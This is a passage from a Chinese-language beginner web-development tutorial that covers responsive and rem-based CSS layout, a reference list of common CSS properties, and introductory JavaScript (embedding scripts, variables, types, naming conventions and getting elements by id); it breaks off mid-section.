class="headerlink" title="7.2.3 响应式布局"></a>7.2.3 响应式布局</h3><p>响应式布局就是使用媒体查询的方式，通过查询浏览器宽度，不同的宽度应用不同的样式块，每个样式块对应的是该宽度下的布局方式，从而实现响应式布局。响应式布局的页面可以适配多种终端屏幕（pc、平板、手机）。</p><p>相应布局的伪代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@media (max-width:960px)&#123;</span><br><span class="line">    .left_con&#123;width:58%;&#125;</span><br><span class="line">    .right_con&#123;width:38%;&#125;</span><br><span class="line">&#125;</span><br><span class="line">@media (max-width:768px)&#123;</span><br><span class="line">    .left_con&#123;width:100%;&#125;</span><br><span class="line">    .right_con&#123;width:100%;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-2-4-基于rem的布局"><a href="#7-2-4-基于rem的布局" class="headerlink" title="7.2.4 基于rem的布局"></a>7.2.4 基于rem的布局</h3><p>首先了解em单位，em单位是参照元素自身的文字大小来设置尺寸，rem指的是参照根节点的文字大小，根节点指的是html标签，设置html标签的文字大小，其他的元素相关尺寸设置用rem，这样，所有元素都有了统一的参照标准，改变html文字的大小，就会改变所有元素用rem设置的尺寸大小。</p><p><strong>cssrem安装</strong></p><p>cssrem插件可以动态地将px尺寸换算成rem尺寸</p><p>下载本项目，比如：git clone <a href="https://github.com/flashlizi/cssrem" target="_blank" rel="noopener">https://github.com/flashlizi/cssrem</a> 进入packages目录：Sublime Text -&gt; Preferences -&gt; Browse Packages… 复制下载的cssrem目录到刚才的packges目录里。 重启Sublime Text。</p><p>配置参数 参数配置文件：Sublime Text -&gt; Preferences -&gt; Package Settings -&gt; cssrem px_to_rem - px转rem的单位比例，默认为40。 max_rem_fraction_length - px转rem的小数部分的最大长度。默认为6。 available_file_types - 启用此插件的文件类型。默认为：[“.css”, “.less”, “.sass”]。</p><h1 id="8-常用css列表"><a href="#8-常用css列表" class="headerlink" title="8. 常用css列表"></a>8. 常用css列表</h1><ul><li>color 设置文字的颜色，如： color:red;</li><li>font-size 设置文字的大小，如：font-size:12px;</li><li>font-family 设置文字的字体，如：font-family:’微软雅黑’;</li><li>font-style 设置字体是否倾斜，如：font-style:’normal’; 设置不倾斜，font-style:’italic’;设置文字倾斜</li><li>font-weight 设置文字是否加粗，如：font-weight:bold; 设置加粗 font-weight:normal 设置不加粗</li><li>line-height 设置文字的行高，设置行高相当于在每行文字的上下同时加间距， 如：line-height:24px;</li><li>font 同时设置文字的几个属性，写的顺序有兼容问题，建议按照如下顺序写： font：是否加粗 字号/行高 字体；如： font:normal 12px/36px ‘微软雅黑’;</li><li>text-decoration 设置文字的下划线，如：text-decoration:none; 将文字下划线去掉</li><li>text-indent 设置文字首行缩进，如：text-indent:24px; 设置文字首行缩进24px</li><li>text-align 设置文字水平对齐方式，如text-align:center 设置文字水平居中</li><li>text-overflow 设置一行文字宽度超过容器宽度时的显示方式，如：text-overflow:clip 将多出的文字裁剪掉 text-overflow:ellipsis 将多出的文字显示成省略号</li><li>white-space 一般用来设置文本不换行，如：white-space:nowrap 设置文本不换行 一般与text-overflow和overflow属性配合使用来让一行文字超出宽度时显示省略号</li><li>list-style 一般用来设置去掉ul或者ol列表中的小圆点或数字 如：list-style:none</li><li>width 设置盒子内容的宽度，如： width：100px;</li><li><p>height 设置盒子内容的高度，如： height：100px;</p></li><li><p>border-top 设置盒子顶部边框的三个属性 如：border-top:5px solid red;设置盒子顶部边框为3像素宽的红色的实线，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section01.html" target="_blank" rel="noopener">盒子模型</a></p></li><li><p>border-left 设置盒子左边边框的三个属性 如：border-left:3px dotted red;设置盒子左边边框为3像素宽的红色的点线，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section01.html" target="_blank" rel="noopener">盒子模型</a></p></li><li><p>border-right 设置盒子右边边框的三个属性 如：border-right:2px dashed red;设置盒子右边框为2像素宽的红色的虚线，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section01.html" target="_blank" rel="noopener">盒子模型</a></p></li><li><p>border-bottom 设置盒子底部边框的三个属性 如：border-bottom:1px solid red;设置盒子底部边框为1像素宽的红色的实线，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section01.html" target="_blank" rel="noopener">盒子模型</a></p></li><li><p>border 同时设置盒子的四个边框，如果四个边的样式统一就使用它 如：border:1px solid #000 设置盒子四个边都是1像素宽的黑色实线，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section01.html" target="_blank" rel="noopener">盒子模型</a></p></li><li><p>padding 设置盒子四个边的内边距 如：padding:10px 20px 30px 40px 分别设置盒子上边(10px)、右边(20px)、下边(30px)、左边(40px)的内边距(顺时针)，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section01.html" target="_blank" rel="noopener">盒子模型</a></p></li><li><p>margin 设置盒子四个边的外边距 如：margin:10px 20px 30px 40px 分别设置盒子上边(10px)、右边(20px)、下边(30px)、左边(40px)的外边距(顺时针)，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section01.html" target="_blank" rel="noopener">盒子模型</a></p></li><li><p>overflow 设置当子元素的尺寸超过父元素的尺寸时，盒子及子元素的显示方式 如：overflow:hidden 超出的子元素被裁切，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section004.html" target="_blank" rel="noopener">元素溢出</a></p></li><li>display 设置盒子的显示类型及隐藏，如：display:block 将盒子设置为以块元素显示 display:none 将元素隐藏，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section02.html" target="_blank" rel="noopener">元素类型</a></li><li>float 设置元浮动 如：float:left 设置左浮动 float:right 设置右浮动，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section03.html" target="_blank" rel="noopener">元素浮动</a></li><li>clear 在盒子两侧清除浮动 如：clear:both 在盒子两侧都不允许浮动，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section03.html" target="_blank" rel="noopener">元素浮动</a></li><li>position 设置元素定位 如：position:relative 设置元素相对定位，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section04.html" target="_blank" rel="noopener">元素定位</a></li><li>background 设置元素的背景色和背景图片，如：background:url(bg.jpg) cyan;设置盒子的背景图片为bg.jpg，背景色为cyan，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/02/mds/section05.html" target="_blank" rel="noopener">元素背景</a></li><li><p>background-size 设置盒子背景图的尺寸，如：background-size:30px 40px;设置背景图的尺寸宽为30px，高为40px，这个属性不能合到background属性中，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/08/mds/section05.html" target="_blank" rel="noopener">retina屏适配</a></p></li><li><p>opacity 设置元素整体透明度，一般为了兼容需要加上filter属性设置 如：opacity:0.1;filter:alpha(opacity=10)</p></li><li>cursor 设置鼠标悬停在元素上时指针的形状 如：cursor:pointer 设置为手型</li><li>outline 设置文本输入框周围凸显的蓝色的线，一般是设为没有 如：outline:none</li><li>border-radius 设置盒子的圆角 如：border-radius:10px 设置盒子的四个角为10px半径的圆角，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/06-07/mds/section02.html" target="_blank" rel="noopener">css圆角</a></li><li>box-shadow 设置盒子的阴影，如：box-shadow:10px 10px 5px 2px pink;设置盒子有粉色的阴影，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/06-07/mds/section02.html" target="_blank" rel="noopener">css阴影</a></li><li>transition 设置盒子的过渡动画，如：transition:all 1s ease;设置元素过渡动画为1秒完成，所有变动的属性都做动画，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/06-07/mds/section03.html" target="_blank" rel="noopener">过渡动画</a></li><li>animation 设置盒子的关键帧动画，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/06-07/mds/section05.html" target="_blank" rel="noopener">关键帧动画</a></li><li><p>transform 设置盒子的位移、旋转、缩放、斜切等变形，如：transform:rotate(45deg);设置盒子旋转45度，详细设置说明：<a href="file:///F:/BaiduYunDownload/Python%E8%AF%BE%E4%BB%B6/%E5%9F%BA%E7%A1%80%E7%8F%AD-%E5%B0%B1%E4%B8%9A%E7%8F%AD%E8%AF%BE%E4%BB%B6%E8%B5%84%E6%96%99%20-1-4%E4%BD%8D%E5%9F%BA%E7%A1%80%E7%8F%AD%20%205-14%E5%B0%B1%E4%B8%9A%E7%8F%AD/06%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%98%B6%E6%AE%B5/%E5%89%8D%E7%AB%AF%E8%B5%84%E6%96%99/%E5%89%8D%E7%AB%AF%E8%AF%BE%E4%BB%B6/06-07/mds/section04.html" target="_blank" rel="noopener">元素变形</a></p></li><li><p>box-sizing 设置盒子的尺寸计算方式，如：box-sizing:border-box 将盒子的尺寸计算方法设置为按边框计算，此时width和height的值就是盒子的实际尺寸</p></li><li><p>border-collapse 设置表格边框是否合并，如：border-collapse:collapse，将表格边框合并，这样就可以制作1px边框的表格。</p></li></ul><h1 id="9-JavaScript"><a href="#9-JavaScript" class="headerlink" title="9. JavaScript"></a>9. JavaScript</h1><h2 id="9-1-JavaScript介绍"><a href="#9-1-JavaScript介绍" class="headerlink" title="9.1 JavaScript介绍"></a>9.1 JavaScript介绍</h2><p>JavaScript是运行在浏览器端的脚步语言，JavaScript主要解决的是前端与用户交互的问题，包括使用交互与数据交互。 JavaScript是浏览器解释执行的，前端脚本语言还有JScript（微软，IE独有），ActionScript( Adobe公司，需要插件)等。</p><p><strong>前端三大块</strong><br>1、HTML：页面结构<br>2、CSS：页面表现：元素大小、颜色、位置、隐藏或显示、部分动画效果<br>3、JavaScript：页面行为：部分动画效果、页面与用户的交互、页面功能</p><h2 id="9-2-JavaScript嵌入页面的方式"><a href="#9-2-JavaScript嵌入页面的方式" class="headerlink" title="9.2 JavaScript嵌入页面的方式"></a>9.2 JavaScript嵌入页面的方式</h2><p>1、行间事件（主要用于事件）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"button"</span> name=<span class="string">""</span> onclick=<span class="string">"alert('ok！');"</span>&gt;</span><br></pre></td></tr></table></figure><p>2、页面script标签嵌入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;        </span><br><span class="line">    alert(<span class="string">'ok！'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>3、外部引入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"js/index.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="9-3-变量"><a href="#9-3-变量" class="headerlink" title="9.3 变量"></a>9.3 变量</h2><p>JavaScript 是一种弱类型语言，javascript的变量类型由它的值来决定。 定义变量需要用关键字 ‘var’</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iNum = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> sTr = <span class="string">'asd'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同时定义多个变量可以用","隔开，公用一个‘var’关键字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> iNum = <span class="number">45</span>,sTr=<span class="string">'qwe'</span>,sCount=<span class="string">'68'</span>;</span><br></pre></td></tr></table></figure><h3 id="9-3-1-变量类型"><a href="#9-3-1-变量类型" class="headerlink" title="9.3.1 变量类型"></a>9.3.1 <strong>变量类型</strong></h3><p>5种基本数据类型：<br>1、number 数字类型<br>2、string 字符串类型<br>3、boolean 布尔类型 true 或 false<br>4、undefined undefined类型，变量声明未初始化，它的值就是undefined<br>5、null null类型，表示空对象，如果定义的变量将来准备保存对象，可以将变量初始化为null,在页面上获取不到对象，返回的值就是null</p><p>1种复合类型：object</p><h3 id="9-3-2-javascript语句与注释"><a href="#9-3-2-javascript语句与注释" class="headerlink" title="9.3.2 javascript语句与注释"></a>9.3.2 <strong>javascript语句与注释</strong></h3><p>1、一条javascript语句应该以“;”结尾</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;    </span><br><span class="line">    <span class="keyword">var</span> iNum = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">var</span> sTr = <span class="string">'abc123'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fnAlert</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(sTr);</span><br><span class="line">    &#125;;</span><br><span class="line">    fnAlert();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>2、javascript注释</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 单行注释</span></span><br><span class="line">    <span class="keyword">var</span> iNum = <span class="number">123</span>;</span><br><span class="line">    <span class="comment">/*  </span></span><br><span class="line"><span class="comment">        多行注释</span></span><br><span class="line"><span class="comment">        1、...</span></span><br><span class="line"><span class="comment">        2、...</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> sTr = <span class="string">'abc123'</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-3-3-变量、函数、属性、函数参数命名规范"><a href="#9-3-3-变量、函数、属性、函数参数命名规范" class="headerlink" title="9.3.3 变量、函数、属性、函数参数命名规范"></a>9.3.3 <strong>变量、函数、属性、函数参数命名规范</strong></h3><p>1、区分大小写<br>2、第一个字符必须是字母、下划线（_）或者美元符号（$）<br>3、其他字符可以是字母、下划线、美元符或数字</p><h3 id="9-3-4-匈牙利命名风格"><a href="#9-3-4-匈牙利命名风格" class="headerlink" title="9.3.4 匈牙利命名风格"></a>9.3.4 <strong>匈牙利命名风格</strong></h3><p>对象o Object 比如：oDiv<br>数组a Array 比如：aItems<br>字符串s String 比如：sUserName<br>整数i Integer 比如：iItemCount<br>布尔值b Boolean 比如：bIsComplete<br>浮点数f Float 比如：fPrice<br>函数fn Function 比如：fnHandler<br>正则表达式re RegExp 比如：reEmailCheck</p><h2 id="9-4-获取元素方法一"><a href="#9-4-获取元素方法一" class="headerlink" title="9.4 获取元素方法一"></a>9.4 获取元素方法一</h2><p>可以使用内置对象document上的getElementById方法来获取页面上设置了id属性的元素，获取到的是一个html对象，然后将它赋值给一个变量，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'div1'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">....</span></span><br><span class="line"><span class="regexp">&lt;div id="div1"&gt;这是一个div元素&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><p>上面的语句，如果把javascript写在元素的上面，就会出错，因为页面上从上往下加载执行的，javascript去页面上获取元素div1的时候，元素div1还没有加载，解决方法有两种：</p><p>第一种方法：将javascript放到页面最下边</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">&lt;div id=<span class="string">"div1"</span>&gt;这是一个div元素&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">....</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    var oDiv = document.getElementById('div1');</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br></pre></td></tr></table></figure><p>第二种方法：将javascript语句放到window.onload触发的函数里面,获取元素的语句会在页面加载完后才执行，就不会出错了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">'div1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">....</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;div id="div1"&gt;这是一个div元素&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><h2 id="9-5-操作元素属性"><a href="#9-5-操作元素属性" class="headerlink" title="9.5 操作元素属性"></a>9.5 操作元素属性</h2><p>获取的页面元素，就可以对页面元素的属性进行操作，属性的操作包括属性的读和写。</p><h3 id="9-5-1-操作属性的方法"><a href="#9-5-1-操作属性的方法" class="headerlink" title="9.5.1 操作属性的方法"></a>9.5.1 <strong>操作属性的方法</strong></h3><p>1、“.” 操作<br>2、“[ ]”操作</p><h3 id="9-5-2-属性写法"><a href="#9-5-2-属性写法" class="headerlink" title="9.5.2 属性写法"></a>9.5.2 <strong>属性写法</strong></h3><p>1、html的属性和js里面属性写法一样<br>2、“class” 属性写成 “className”<br>3、“style” 